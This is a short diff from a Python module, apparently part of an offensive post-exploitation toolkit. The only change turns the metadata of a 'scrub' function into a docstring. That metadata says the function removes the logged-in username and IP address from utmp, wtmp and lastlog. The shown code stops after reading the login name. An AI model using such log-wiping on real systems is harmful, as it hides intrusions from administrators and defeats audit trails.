@@ -1,8 +1,10 @@
 
 def scrub():
-  __description__ = "Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method."
-  __author__ = "ohdae : bindshell[at]live[dot]com"
-  __short__ = "cleans wtmp, utmp and lastlog"
+  '''
+  @description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
+  @author: ohdae [bindshell@live.com]
+  @short: cleans utmp, wtmp and lastlog
+  '''
   try:
     Current_User = os.getlogin()
   except OSError:
